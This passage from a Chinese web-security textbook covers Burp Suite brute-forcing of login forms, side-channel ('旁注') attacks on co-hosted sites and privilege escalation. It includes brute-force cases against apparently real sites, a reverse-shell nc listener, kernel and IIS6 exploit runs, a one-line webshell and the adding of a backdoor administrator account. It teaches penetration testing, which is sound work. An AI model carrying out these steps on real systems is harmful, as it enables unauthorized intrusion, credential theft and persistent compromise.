d><td></td><td></td><td>520</td><td></td><td></td></tr><tr><td colspan="2">0</td><td>200</td><td></td><td></td><td colspan="2">497</td><td>bas</td></tr><tr><td>1</td><td>zhangwei</td><td>200</td><td></td><td></td><td colspan="2">497</td><td></td></tr><tr><td colspan="8">Request Response</td></tr><tr><td colspan="8">Rev Headers Hex</td></tr><tr><td colspan="8">Content-Length: 168
Content-Type: text/html
Expires: Sun, 31 Jul 2016 03:26:34 GMT
Server: Microsoft-IIS/7.0
Set-Cookie: ASPSESSIONIDAACSASAR=GCCCDFADJKOLDGDNOLMICOEP; path=/X-Powered-By: ASP.NET
Date: Mon, 01 Aug 2016 03:26:35 GMT
Connection: close</td></tr></table>


图 11-14 Intruder 攻击结果


验证一下破解出来的账号和密码，使用 wanghao/wanghao 进行登录，登录成功，如图 11-15 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0129_018e354d0ffd.jpg)



图 11-15 成功登录


案例二：

某 OA 办公系统，登录处没有验证码限制。登录界面如图 11-16 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0130_dd45e5ca378f.jpg)



图 11-16 在登录界面输入账号和密码


配置 Burp Suite 的 Proxy 拦截 HTTP 请求包，抓取登录时发送的数据包，如图 11-17 所示。

<table><tr><td colspan="4">Request to http://www.your-mart.cn:80 [218.76.51.168]</td></tr><tr><td colspan="4">Forward Drop Intercept on Action</td></tr><tr><td colspan="4">Read Params Headers Hex</td></tr><tr><td colspan="4">Send to Spider
Do an active scan</td></tr><tr><td colspan="4">Send to Internet Ctrl+R</td></tr><tr><td colspan="4">Send to Repeater Ctrl+R</td></tr><tr><td colspan="4">Send to Sequencer</td></tr><tr><td colspan="4">Send to Comparer</td></tr><tr><td colspan="4">Send to Decoder</td></tr><tr><td colspan="4">Request in browser ▷</td></tr><tr><td colspan="4">Engagement tools ▷</td></tr><tr><td colspan="4">Change request method
Change body encoding
Copy URL
Copy as curl command
Copy to file
Paste from file
Save item, 
Don&#x27;t intercent requests ▷</td></tr></table>


图 11-17 将登录请求发送到 Intruder



首先清除原先默认设置的变量，再设置要进行暴力破解的参数：用户名和密码为变量，攻击类型选择为 Battering ram，这种攻击类型表示，两个变量共用一个 Payload，也就是账号和密码相同。为用户名添加变量标记，如图 11-18 所示。


<table><tr><td rowspan="2">Attack type:</td><td>Sniper</td><td></td></tr><tr><td></td><td></td></tr><tr><td colspan="3">POST /office/oa_login.asp HTTP/1.1
Host: www.your-mart.cn
Proxy-Connection: keep-alive
Content-Length: 50
Cache-Control: max-age=0
Origin: http://www.your-mart.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KH
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/* 
Referer: http://www.your-mart.cn/office/oa_login.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASPSESSIONIDCCDDBBBC=JIPJHNGDPLOPCPCLMKNDHMDF
username=Swangweis&amp;passwd=123456&amp;Submit=%CC%E1%BD%BB</td></tr></table>


图 11-18 为用户名添加变量标记


设置变量的 Payload，单击 Load 按钮加载国人姓名拼音 top500 的字典，如图 11-19 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0131_b4414cbf7283.jpg)



图 11-19 加载国人姓名拼音的字典



选择 Intruder→Start attack 命令，可以看到这里有两种不同的状态码，302 跳转为登录成功后的请求，如图 11-20 所示。


<table><tr><td>Request</td><td>Puylbd</td><td>Status</td><td>Error</td><td>Timeout</td><td>Lenic_1</td><td>Δ</td><td>Comment</td></tr><tr><td>255</td><td>liugy</td><td>302</td><td>☐</td><td>☐</td><td>1141</td><td></td><td></td></tr><tr><td>353</td><td>chcnf</td><td>302</td><td>☐</td><td>☐</td><td>1153</td><td></td><td></td></tr><tr><td>759</td><td>wxh</td><td>302</td><td>☐</td><td>☐</td><td>1157</td><td></td><td></td></tr><tr><td>0</td><td></td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td>baseline request</td></tr><tr><td>1</td><td>zhangwei</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>2</td><td>zvi</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>3</td><td>zhangw</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>4</td><td>wangwei</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>5</td><td>ww</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>6</td><td>wangw</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>7</td><td>wangfang</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td>8</td><td>wf</td><td>200</td><td>☐</td><td>☐</td><td>14573</td><td></td><td></td></tr><tr><td colspan="8"></td></tr><tr><td colspan="8"></td></tr><tr><td colspan="8"></td></tr><tr><td colspan="8"></td></tr><tr><td colspan="8">Content-Length: 48
Cache-Control: max-age=0
Origin: http://www.your-mart.cn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.270-
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://www.your-mart.cn/office/oa_login.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASPSESSIONIDCCDDBBBC=JIPJHNGDPLOPCPCLMKNDHMDF
Connection: close
username=chenf&amp;passwd=123456&amp;submit=%CC%E1%BD%BB</td></tr></table>


图11-20 Intruder攻击后的结果


使用 chenf/123456 进行登录，验证是否破解成功，如图 11-21 所示。

<table><tr><td colspan="2">部门：财务管理中心</td><td colspan="2">姓名：陈南</td></tr><tr><td colspan="2"></td><td colspan="2"></td></tr><tr><td colspan="4">2016年8月8日查询</td></tr><tr><td colspan="4">标题为黑色表示此工作性质一般且未完成，标题为兰色表示此工作性质一般且已完成
标题为红色表示此工作性质正常且未完成，标题为棕色表示此工作性质正常且已完成</td></tr><tr><td>星期二</td><td>星期三</td><td>星期四</td><td>星期五</td></tr><tr><td>2号</td><td>3号</td><td>4号</td><td>5号</td></tr><tr><td>9号</td><td>10号</td><td>11号</td><td>12号</td></tr><tr><td>10号</td><td>17号</td><td>18号</td><td>19号</td></tr><tr><td>23号</td><td>24号</td><td>25号</td><td>26号</td></tr><tr><td>30号</td><td>31号</td><td></td><td></td></tr></table>


图 11-21 成功登录 OA 系统


## 11.4 实战操作

这里选用 DVWA 这个漏洞演练平台，搭建的教程地址为：http://bbs.51cto.com/thread-1130146-1.html。

打开本地搭建 DVWA 平台的地址。测试中的 DVWA 是放在网站根目录下，所以 URL 为 http://localhost/dvwa/login.php，如图 11-22 所示为 DVWA 的登录页面。

![image](MinerU_markdown_Web安全基础教程_assets/image_0132_da807991097f.jpg)



图 11-22 DVWA 登录页面


输入常见的管理员账号 admin 和任意密码，Burp Suite 的 Proxy 功能开启拦截，捕捉登录时的 HTTP 请求数据包，然后将 HTTP 请求数据包发送到 Intruder 来进行暴力破解尝试，如图 11-23 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0133_424a17c3d82e.jpg)



图11-23 将HTTP发送到Intruder


切换到 Intruder 标签页，然后设置密码为变量，添加变量标记，如图 11-24 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0134_b3be4aa30bc0.jpg)



图 11-24 设置密码为变量


对变量对应的 Payload 进行设置，加载弱口令字典，如图 11-25 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0135_df77ccf91848.jpg)



图 11-25 加载密码字典


然后切换到 Options 标签页，设置跟随 URL 重定向，如图 11-26 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0136_30fe7f4c93f7.jpg)



图 11-26 设置跟随 URL 重定向


选择 Intruder→Start attack 命令，让 Intruder 开始攻击，如图 11-27 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0137_71c2c5c9e048.jpg)



图 11-27 Intruder 开始攻击



在 Intruder 攻击成功之后，可以在 Results 标签页看到暴力破解结果，如图 11-28 所示，通过几个值可以分析比较，一个是返回的响应的长度，另一个是返回的状态码。可以通过长度比较，返回响应长度最长对应的密码便是正确密码。


<table><tr><td colspan="8">Filer: Showing all items</td></tr><tr><td>Request</td><td>Pay2ad</td><td>Status</td><td>Error</td><td>Redrec</td><td>Timeout</td><td>Length</td><td>Commen</td></tr><tr><td>177</td><td>P-#N/0d</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>4755</td><td></td></tr><tr><td>0</td><td></td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>5616</td><td>baseline</td></tr><tr><td>65</td><td>31415926</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1762</td><td></td></tr><tr><td>175</td><td>office2007</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1740</td><td></td></tr><tr><td>5</td><td>~@#S%^&amp;*</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>10</td><td>@sina.com</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>15</td><td>capslock</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>20</td><td>thursday</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>25</td><td>december</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>30</td><td>000000000</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>35</td><td>00224466</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr><tr><td>40</td><td>0099887766,</td><td>200</td><td>☐</td><td>1</td><td>☐</td><td>1723</td><td></td></tr></table>


图11-28 Results标签页


使用账号/密码为 admin/password 进行登录，登录成功，如图 11-29 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0138_4400ebe3e6f3.jpg)



图 11-29 成功利用破解后的账号和密码登录


详细操作流程请参考第 11 章视频 11-1。

## 旁注取

旁注攻击即攻击者在攻击目标网站时，对目标网站“无从下手”，在找不到漏洞的情况下，攻击者可能会通过同一服务器的其他网站渗透到目标网站，从而获取目标网站的权限，这一过程就是旁注攻击。

旁注攻击不是利用目标站点程序的漏洞达到攻击的目的，而是利用来自“外部”的攻击。攻击者在进行旁注攻击操作时，一般会与提权结合在一块，旁注与提权是密不可分的（提权就是将普通用户的权限提升成管理员的权限）。

## 12.1 IP 逆向查询

通过旁注的定义可知：攻击者通过攻击同服务器的其他网站并通过提权漏洞或其他漏洞达到渗透目标网站的目的。那么攻击者如何知道服务器上部署了哪些网站呢？

在无法直接、准确地知道服务器上到底部署了多少网站的情况下，可使用模糊查询的方式获取与目标网站同属同一服务器的其他网站。许多网站提供了基于IP到网站的逆向查询功能，通过这类网站即可查找部署在同一服务器上的其他网站，如站长工具(http://tool.chinaz.com/)，工具网站如图12-1所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0139_2796821100dc.jpg)



图 12-1 站长工具


查询网址 www.freebuf.com，如图 12-2 所示。

<table><tr><td>IP查询</td><td>IP批目查询</td><td>IP所在地批量查询</td><td>同IP网站查询</td><td>IP WHOIS查询</td><td>友情的反同IP检测</td><td></td></tr><tr><td></td><td></td><td></td><td>www.freebuf.com</td><td></td><td>查询</td><td>查问记录 -</td></tr><tr><td colspan="7">IP地址：180.97.164.2 [江苏省苏州市 电信]</td></tr><tr><td>序号</td><td colspan="2">姓名</td><td colspan="4">地区</td></tr><tr><td>1</td><td colspan="2">open.freebuf.com</td><td colspan="4">FreeBuf公开课 | 互联网安全在线教育视频</td></tr><tr><td>2</td><td colspan="2">bar.freebuf.com</td><td colspan="4">Freebuf小酒馆</td></tr><tr><td>3</td><td colspan="2">fit.freebuf.com</td><td colspan="4">2016 FIT 互联网安全创新大会</td></tr><tr><td>4</td><td colspan="2">shop.freebuf.com</td><td colspan="4">简短 | FreeBuf.COM | 员容生活，创意人生</td></tr><tr><td>5</td><td colspan="2">static.freebuf.com</td><td colspan="4">-</td></tr><tr><td>6</td><td colspan="2">wit.freebuf.com</td><td colspan="4">WltAwards 2015互联网安全年度评选</td></tr><tr><td>7</td><td colspan="2">freebuf.com</td><td colspan="4">FreeBuf.COM | 关注黑客与设备</td></tr><tr><td>8</td><td colspan="2">www.freebuf.com</td><td colspan="4">FreeBuf.COM | 关注黑客与设备</td></tr></table>


图 12-2 同 IP 网站查询


## 12.2 目录越权

正常情况下，每个 Web 应用程序都存在于一个单独的目录中，各个应用程序之间互不干扰，独立运行。但是当服务器管理员配置不当时，就会发生目录越权的风险。

例如，服务器上网站 DVWA 放在 D:\tool\wampserver\wamp\www\DVWA 目录中，此时正确的做法是将 127.0.0.1/DVWA 所对应的程序限制在 D:\tool\wampserver\wamp\www\DVWA 目录中操作，不应该有其他目录读写的权限。

若服务器上的网站分别有 127.0.0.1/chanzhiEPS，127.0.0.1/dedecmsgbk，127.0.0.1/dedecmsutf8，127.0.0.1/fengcms，127.0.0.1/phpcmsgbk，127.0.0.1/wordpress 等，攻击者已经获得 127.0.0.1/DVWA 网站的权限，并且已上传 WebShell，若目录权限未分配好，那么攻击者就可以直接进行目录越权，将 Shell 写入到 127.0.0.1/chanzhiEPS，127.0.0.1/dedecmsgbk，127.0.0.1/dedecmsutf8，127.0.0.1/fengcms，127.0.0.1/phpcmsgbk，127.0.0.1/wordpress 等网站中，如图 12-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0140_dfae5afb48ea.jpg)



图 12-3 获取服务器控制权


目录越权后，服务器上所有的网站都可能面临被入侵的风险，甚至服务器也可能被提权，因此攻击者可以通过目录越权漏洞了解服务器架构，掌握敏感信息，为下一步提权做准备。所以尽可能地让“大堤没有蚁穴”，无论高危漏洞还是低危漏洞，都应一视同仁。

## 12.3 实战操作

目标网站：https://demo.testfire.net/。

测试流程：

（1）对目标网站进行逆向查询。

（2）查看部署该网站的服务器上部署的其他网站漏洞。

（3）利用其他网站的漏洞获取服务器控制权限。

（4）获取目标网站敏感信息，对网站进行增、删、改等操作。

具体操作见视频 12-1。

## 提 积

提权是指将服务器普通用户提升到管理员用户的一种操作。提权常常用于辅助旁注攻击。如攻击者已经获得目标网站同一服务器的任意网站，通过提权拿到服务器的管理员权限，当拥有管理员权限后，几乎可以对服务器进行任何操作，因此旁注攻击成功的关键是看服务器的提权成功与否。

提权一般分为两种：一种是溢出提权，另一种是第三方组件提权。

- 溢出提权（仅了解）：是指攻击者利用系统本身或者系统中软件的漏洞来获取 root 权限，其中，溢出提权又分为远程溢出与本地溢出。

◇ 远程溢出：是指攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的 root 权限。有名的 MS-08067 溢出漏洞是远程溢出的代表。攻击者在攻击目标服务器时，使用远程溢出这种攻击手段是比较少的，服务器通常打了漏洞补丁，这样的旧的溢出程序一般不会再起作用，可以说远程溢出已经不存在了。

✿ 本地溢出：成功率更高，也是主流的一种提权方式。本地溢出提权时，攻击者首先需要有一个服务器用户，且需要有执行权限的用户才能发起提权。攻击者通常会向服务器上传本地溢出程序，在服务器端执行。若服务器存在漏洞，将会溢出 root 权限。

第三方组件提权（了解）：服务器运行时可能需要很多组件支持，如服务器安装了.NET framework、Pcanywhere、MySQL、SQL Server等组件，攻击者有可能通过这类组件进行提权操作。

## 1. 信息收集

在渗透测试中，信息收集极为重要，同样，攻击者在进行提权操作时进行信息收集也是必要的。

## （1）服务器支持的脚本语言

前面已经详细阐述了探测服务器脚本语言的重要性，若运气好，后续的步骤都不需要了，攻击者可以系统管理员身份执行系统命令。

## (2) 服务器端口探测

探测服务器端口也是必要的，攻击者探测端口的最主要目的是为了看服务器安装了哪些软件，得知之后，可以针对某一款软件有针对性地提权。如服务器安装了 MySQL 之后，默认会监听 3306 端口，攻击者就可以尝试使用 MySQL 进行提权。

探测服务器端口有三种方式：本地扫描，远程扫描，执行系统命令查看端口。

本地扫描速度较快，一般 WebShell 自带端口扫描功能。

远程扫描是在外部通过端口扫描工具扫描，如 nmap-A -p 127.0.0.1。

执行系统命令查看端口是通过执行系统命令 netstat-an 查看开放端口，这种方式也是最准确的，如图 13-1 所示。

<table><tr><td colspan="4">[ * ]基本信息 [C:D:E: Windows NT ZYLO311 6.1 build 7601 (Windows 7 Business D:\tool\wampserver\wamp\www\dedecmsgbk\&gt; netstat -an 活动连接</td></tr><tr><td>协议</td><td>本地地址</td><td>外部地址</td><td>状态</td></tr><tr><td>TCP</td><td>[::]:80</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:135</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:443</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:445</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:623</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1025</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1026</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1027</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1036</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1037</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1154</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1162</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:3306</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:3389</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:8834</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:16992</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1:1293</td><td>[::]:0</td><td>LISTENING</td></tr><tr><td>TCP</td><td>[::]:1:1295</td><td>[::]:1:1297</td><td>ESTABLISHED</td></tr><tr><td>TCP</td><td>[::]:1:1297</td><td>[::]:1:1295</td><td>ESTABLISHED</td></tr><tr><td>TCP</td><td>[::]:8307</td><td>[::]:0</td><td>LISTENING</td></tr></table>


图 13-1 查看端口开放情况


## (3) 搜索路径信息

搜索路径信息也是重点之一，如可以访问的目录，软件的安装路径等，在提权时可能会遇到。查找路径时，有时会有意外收获，如数据库连接信息、数据库密码等。

## 2. 提权辅助

提权操作有时非常曲折，需要多种手段的配合才能得到服务器终端连接。

## (1) 3389 端口

3389 端口是微软提供的远程桌面服务默认端口，也常常被称作终端端口。远程桌面协议即 Remote Desktop Protocol，简称 RDP。

3389 端口也是攻击者喜欢的端口之一。攻击者在对主机提权后，通常会加一个隐蔽的管理员账户，然后通过 3389 端口连接服务器，就像连接自己的计算机一样。

## (2) 端口转发

如何连接内网服务器？一般情况下是不能的，但是攻击者拥有目标服务器权限后，就

可使用端口转发技术，继续连接服务器。

## 13.1 获取系统权限

## 1. Linux 提权

第一步：当拿到 WebShell 后（首先确定是否为 root 权限），使用 unme-a 命令查看服务器内核版本，如图 13-2 所示。

<table><tr><td>命令参数 uname -a</td><td>--命令集合--</td><td>执行</td></tr><tr><td colspan="3">Linux service.elinkhost.com 2.6.18-194.11.3.el5 #1 SMP Mon Aug 30 16:19:16 EDT 2010 x86_64 x86_64 x86_64 GNU/Linux</td></tr></table>


图 13-2 查看服务器内核版本


第二步：查找对应内核版本的溢出程序，并上传到/tmp 目录，因为这个目录一般可写、可执行。

第三步：找一个外网 IP，监听 12666 端口（当然 12666 可以改），用 nc-l-n-v-p 12666 命令监听，如图 13-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0141_78e1f8262c51.jpg)



图13-3 nc监听



第四步：在 WebShell 中填写监听 12666 计算机外网 IP（必须是外网 IP，否则需要端口转发），如图 13-4 所示。


<table><tr><td>文件名</td><td colspan="2">你的地址</td></tr><tr><td>部门编号</td><td colspan="2">连接端口 12666</td></tr><tr><td>部门类型</td><td colspan="2">执行方式 perl ▼</td></tr><tr><td>部门编码</td><td>开始连接</td><td>这里填监听12666端口的电脑外网ip</td></tr><tr><td>日期/年</td><td rowspan="3" colspan="2">创建/tmp/spider_bc成功
执行命令失败
你可以尝试连接端口 (nc -l -n -v -p 12666)</td></tr><tr><td>系统代码</td></tr><tr><td>执行命令</td></tr><tr><td></td><td colspan="2"></td></tr></table>


图13-4 填写外网IP


连接成功（同时看到当前账户只是普通权限），如图 13-5 所示。

<table><tr><td>C:\Documents and Settings\Administrator\桌面\nc&gt;nc -l -n -v -p 12666
listening on [any] 12666 ...
connect to [192.168.1.199] from (UNKNOWN) [117.79.82.3] 41566
Linux service.elinkhost.com 2.6.10-124.11.3.e15 #1 SMP Non Aug 30 16:19:16 EDT 2
310 x86_64 x86_64 x86_64 GNU/Linux
uid=515(Lidawe1816) yid=516(Lidawe1816) groups=516(Lidawe1816)</td></tr></table>


图13-5 连接成功


第五步：进入/tmp 目录，用 cd /tmp 命令查看上传的溢出程序，如图 13-6 所示。

```batch
ls -1 2.6.18-194
-rwcrwxpwx 1 lidawei816 lidawei816 19005 Nov 2 00:12 2.6.18-194 
```


图 13-6 查看溢出程序


本次上传的 exp 是编译过的，若没有编译，则使用 gcc-o /tmp/ 文件名 /tmp/ 文件名.c 命令进行编译，现在直接溢出即可，如图 13-7 所示。

```txt
./2.6.18-194
sh: no job control in this shell
sh-3.2# id
uid=0(root) gid=516(lidawe i816) groups=516(lidawe i816)
sh-3.2# 
```


图13-7 成功提权


现在看到 uid 已经为 0（即 root 权限），这就是一次简单的 Linux 提权。

## 2. Windows 提权

在 Windows 下进行本地提权时，重点看用户是否可以执行溢出程序，也就是所谓的执行权限。在 ASP 中依靠 wscript.shell 命令组件，而 ASP.NET 脚本语言中依靠的是.NET Framework，在 JSP 中却是依靠 JVM 来调用系统命令，各自实现的方式有所不同。

所以在 Windows 中进行本地溢出提权时，一般会看服务器所支持的脚本语言是否支持 ASP、PHP、ASP.NET、JSP。有时服务器会支持很多脚本语言，若其中一种脚本没有执行命令权限，或许另一个就可以。如服务器支持 ASP 与 ASP.NET，若 ASP 脚本不能执行系统命令，就可以尝试 ASP.NET 脚本来调用系统命令。若服务器支持 JSP 脚本，一般可以直接调用系统命令，很多时候 JSP 是以 administrator 权限来运行的。所以探测脚本信息是非常有必要的。

得到 webshell 时，看是否可以执行简单的系统命令，收集一下系统等敏感信息，为下一步提权做准备。若已得到网站的 WebShell，打开 WebShell，如图 13-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0142_241f9e01aab2.jpg)


![image](MinerU_markdown_Web安全基础教程_assets/image_0143_50fcb119ff20.jpg)



图13-8 无法执行cmd命令



图 13-8 显示无法执行系统命令，尝试上传一个自己的 cmd 文件，在上传之前首先查询可读可写的文件，如图 13-9 所示。


<table><tr><td colspan="2">[All_Users] (6) [開始 菜單] (7) [程序] (8) [RECYCLER(CA)] (9) [RECYCLER(dA)] (10) [RECYCLER(eA)] 
UDOWS] (6) [PHP] (7) [Mssql] (8) [preI文件夹] (9) [pcAnywhere] (10) [Alluser桌面]</td></tr><tr><td rowspan="2"></td><td>返回</td></tr><tr><td>指定文件夹根目录：C:\recycler\可读,可写。
文件夹：C:\RECYCLERIS-1-5-21-1806940052-281644135-2904027466-500 不可读,不可写。
注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件！
返回
文件夹：d:\recycler\不存在或无读权限！
注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件！
返回
文件夹：e:\recycler\不存在或无读权限！
注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件！
返回
文件夹：f:\recycler\不存在或无读权限！
注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件！
返回</td></tr><tr><td></td><td>指定文件夹根目录：C:\wmpubl\可读,可写。
文件夹：C:\wmpublwmiislog 可读,可写。
注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件！
返回</td></tr></table>


图13-9 找可读可写文件


找到可读可写目录后上传自己的 cmd（本地溢出利用程序），如图 13-10 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0144_baa56a571213.jpg)



图 13-10 上传 cmd


选择 wscript.shell 命令组件，显示无权访问，如图 13-11 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0145_343257e5a782.jpg)



图 13-11 cmd 拒绝访问


若还是执行不了，可利用“中国菜刀”（网站管理工具）提权，上传一个一句话木马，用“中国菜刀”连接，如图13-12所示即成功上传了一句话木马。

![image](MinerU_markdown_Web安全基础教程_assets/image_0146_dbae3f024494.jpg)



图13-12 上传一句话木马


用 “中国菜刀” 连接一句话木马，如图 13-13 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0147_384cbff032d5.jpg)



图 13-13 连接一句话木马


打开虚拟客户端并执行系统命令（whoami），发现默认的 cmd 拒绝访问，再执行前面上传的 cmd 还是拒绝访问，如图 13-14 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0148_8b1a56eebde6.jpg)



图 13-14 刚上任的 cmd 拒绝访问



这可能是因为没有权限调用 C:\wmpub\下的文件。那么再上传 cmd 到大马的路径，并再次执行系统系统命令（whoami），发现成功了，如图 13-15 所示。


<table><tr><td>[★] 磁盘列表 [C:D:]</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; help</td></tr><tr><td>设置终端路径: SETP c:\windows\system32\cmd.exe 或者 SETP /bin/sh</td></tr><tr><td>切换到根目录: ROOT</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; SETP c:\windows\system32\cmd.exe</td></tr><tr><td>设置终端路径为::c:\windows\system32\cmd.exe</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; whoami
[Err] 拒绝访问。</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; setp C:\wmpub\Cmd.exe</td></tr><tr><td>设置终端路径为::C:\wmpub\Cmd.exe</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; whoami
[Err] 拒绝访问。</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; setp C:\inetpub\wwwroot\s\cmd.exe</td></tr><tr><td>设置终端路径为::C:\inetpub\wwwroot\s\cmd.exe</td></tr><tr><td>c:\inetpub\wwwroot\s\&gt; whoami
nt authority\network service</td></tr><tr><td>C:\Inetpub\wwwroot\s\&gt; |</td></tr></table>


图 13-15 重新上传 cmd 并成功执行 whoami（查看权限）命令


可以发现 nt authority/service 权限（权限很小），再看一下系统版本信息和补丁情况，如图 13-16 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0149_89aafb464771.jpg)



图 13-16 收集服务器信息


发现 Windows Server 2003 并安装了一个补丁, 由于是 IIS 6.0 的环境, 先上传一个 IIS 6.0 的 exp, 如图 13-17 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0150_47b4b6745677.jpg)



图 13-17 第一次执行 IIS 6 exp 权限没有提升


下面去看看用 exp 执行 cmd 命令，权限是否提升，如图 13-18 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0151_52e2c1a038fe.jpg)



图 13-18 成功提升权限


已提升为 system 权限了，利用 system 权限可直接添加账户，并加入到管理员组（admintony/admintony），如图 13-19 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0152_83391a152936.jpg)



图 13-19 添加账户


成功添加账户到管理员组，如图 13-20 所示。

<table><tr><td colspan="3">[IIS6Up]--&gt;This exploit gives you a Local System shell
[IIS6Up]--&gt;Set registry OK
[process walking]: 1748 iis6.exe
[process walking]: 2020 cmd.exe
[process walking]: 3816 wmiprvse.exe
[IIS6Up]--&gt;Got WMI process Pid: 3816
[Try 1 time...]
[IIS6Up]--&gt;Found token SYSTEM
[*]Running command with SYSTEM Token...
[*]Command: net localgroup administrators admintony /add
[+]Done, command should have ran as SYSTEM!
命令成功完成。</td></tr><tr><td colspan="3">C:\Inetpub\wwwroot\s&#x27;&gt; C:\inetpub\wwwroot\s\iis6.exe &quot;net user&quot;
[IIS6Up]--&gt;IIS Token PipeAdmin golds7n Version
[IIS6Up]--&gt;This exploit gives you a Local System shell
[IIS6Up]--&gt;Set registry OK
[process walking]: 1240 iis6.exe
[process walking]: 3816 wmiprvse.exe
[IIS6Up]--&gt;Got WMI process Pid: 3816
[Try 1 time...]
[IIS6Up]--&gt;Found token SYSTEM
[*]Running command with SYSTEM Token...
[*]Command: net user
[+]Done, command should have ran as SYSTEM!</td></tr><tr><td colspan="3">\(\)的用户帐户</td></tr><tr><td>admin
ASPNET
IWAM ADMIN-F47791C03</td><td>Administrator
Guest</td><td>admintony
IUSR_ADMIN-F47791C03</td></tr><tr><td colspan="3">命令运行完毕，但发生一个或多个错误。</td></tr></table>


图 13-20 成功添加账户到管理员组



查看是否开启了远程桌面连接（3389），如图 13-21 所示。


